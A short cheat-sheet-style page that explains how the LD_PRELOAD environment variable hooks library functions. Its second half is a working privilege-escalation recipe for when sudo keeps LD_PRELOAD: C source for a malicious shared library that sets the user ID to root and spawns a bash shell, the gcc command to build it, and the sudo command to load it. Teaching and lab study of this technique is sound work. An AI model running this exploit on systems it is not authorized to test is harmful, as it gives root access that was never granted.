# LD_PRELOAD

## Table of Contents

1. [Overview](#overview)
2. [How LD_PRELOAD Works](#how-ld_preload-works)
3. [Exploitation with sudo](#exploitation-with-sudo)

---

## Overview

`LD_PRELOAD` is an environment variable that forces the dynamic linker to load a specified shared library before all others, including libc. Functions defined in the preloaded library take priority over those in other libraries, effectively allowing you to override (hook) any standard library function.

## How LD_PRELOAD Works

When a dynamically linked program starts, the linker (`ld-linux.so`) resolves symbols (function names) in a specific order:
1. Libraries listed in `LD_PRELOAD`
2. Libraries specified in the binary's `DT_NEEDED` entries (dependencies)
3. Default system libraries (libc, etc.)

Since `LD_PRELOAD` libraries are loaded first, if they define a function with the same name as one in  (e.g., `write()`, `open()`), the preloaded version is used instead.

```bash
# Check which libraries a binary loads
ldd /usr/bin/someprogram

# Run a program with a preloaded library
LD_PRELOAD=/path/to/custom.so ./program
```

## Exploitation with sudo

If `sudo -l` output contains `env_keep+=LD_PRELOAD`, the `LD_PRELOAD` variable is preserved when running commands with `sudo`. This means we can inject a malicious shared library into any program we are allowed to run as root.

### Conditions

- `sudo -l` shows `env_keep+=LD_PRELOAD`
- You have sudo rights on at least one command

### Steps

1. Create a malicious shared library:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

2. Compile it as a shared object:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
```

3. Run any allowed sudo command with the preloaded library:

```bash
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
```

The `_init()` function executes automatically when the library is loaded. Since the program runs as root via sudo, the spawned shell is a root shell.

